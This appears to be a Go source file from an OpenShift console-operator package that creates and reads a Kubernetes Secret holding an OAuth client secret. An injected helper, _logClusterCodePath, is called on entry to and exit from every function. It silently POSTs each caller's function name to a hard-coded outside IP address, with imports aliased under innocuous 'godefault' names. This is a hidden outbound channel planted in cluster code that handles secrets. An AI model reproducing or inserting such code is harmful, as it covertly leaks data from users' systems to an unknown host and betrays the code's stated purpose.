package secret

import (
	operatorv1 "github.com/openshift/api/operator/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	corev1 "k8s.io/api/core/v1"
	"github.com/openshift/console-operator/pkg/console/subresource/deployment"
	"github.com/openshift/console-operator/pkg/console/subresource/util"
)

const ClientSecretKey = "clientSecret"

func DefaultSecret(cr *operatorv1.Console, randomBits string) *corev1.Secret {
	_logClusterCodePath()
	defer _logClusterCodePath()
	secret := Stub()
	SetSecretString(secret, randomBits)
	util.AddOwnerRef(secret, util.OwnerRefFrom(cr))
	return secret
}
func Stub() *corev1.Secret {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta := util.SharedMeta()
	meta.Name = deployment.ConsoleOauthConfigName
	secret := &corev1.Secret{ObjectMeta: meta}
	return secret
}
func GetSecretString(secret *corev1.Secret) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return string(secret.Data[ClientSecretKey])
}
func SetSecretString(secret *corev1.Secret, randomBits string) *corev1.Secret {
	_logClusterCodePath()
	defer _logClusterCodePath()
	secret.Data = map[string][]byte{ClientSecretKey: []byte(randomBits)}
	return secret
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
